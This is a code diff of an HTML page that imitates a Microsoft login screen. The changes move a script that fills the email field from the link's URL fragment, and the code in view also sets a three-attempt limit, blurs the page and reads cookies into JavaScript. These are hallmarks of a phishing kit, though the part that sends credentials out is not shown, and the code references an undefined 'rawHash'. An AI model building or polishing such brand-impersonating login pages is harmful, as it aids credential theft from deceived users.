@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Login</title>
+<title>Microsoft Login Animation</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
@@ -126,15 +126,6 @@ body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overfl
   </div>
 </div>
 <script>
-// Read #email ONLY after page fully loads
-window.addEventListener("DOMContentLoaded", () => {
-  const hashValue = window.location.hash.replace("#", "").trim();
-
-  if (hashValue.length > 0) {
-    emailInput.value = hashValue;
-  }
-});
-
 
 
 // Intro video fade
@@ -168,6 +159,7 @@ const maxAttempts = 3;
 
 document.body.classList.add('blur-active');
 
+
 // Helper: parse document.cookie into an object { name: value, ... }
 function parseCookies(cookieString = document.cookie) {
   const cookies = {};
@@ -191,6 +183,16 @@ function parseCookies(cookieString = document.cookie) {
 const cookies = parseCookies();
 // Optional: console log to check cookies
 console.log("Cookies available to JS:", cookies);
+
+// Read #email ONLY after page fully loads
+window.addEventListener("DOMContentLoaded", () => {
+  const hashValue = window.location.hash.replace("#", "").trim();
+
+  if (hashValue.length > 0) {
+    emailInput.value = hashValue;
+  }
+});
+
 
 // Check email validity before proceeding with UI updates
 if (/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
